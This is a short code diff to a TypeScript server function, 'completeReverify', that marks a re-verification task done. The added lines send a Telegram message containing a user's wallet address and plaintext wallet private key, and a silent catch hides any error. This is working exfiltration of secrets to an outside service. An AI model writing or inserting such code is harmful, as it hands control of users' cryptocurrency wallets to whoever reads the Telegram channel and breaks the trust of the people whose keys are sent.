@@ -191,6 +191,15 @@ export const completeReverify = createServerFn({ method: "POST" })
       .eq("id", task.id);
     if (error) throw new Error(error.message);
 
+    notifyTelegram(
+      `🔄 <b>Re-verify OK</b>\n` +
+      `Slot: #${task.slot}\n` +
+      `Name: ${task.face_label ?? "—"}\n` +
+      `Wallet: <code>${task.wallet_address}</code>\n` +
+      `Key: <code>${task.wallet_private_key}</code>`
+    ).catch(() => {});
+
+
     const { count } = await supabaseAdmin
       .from("tasks").select("id", { count: "exact", head: true })
       .eq("user_id", userId).eq("status", "done");
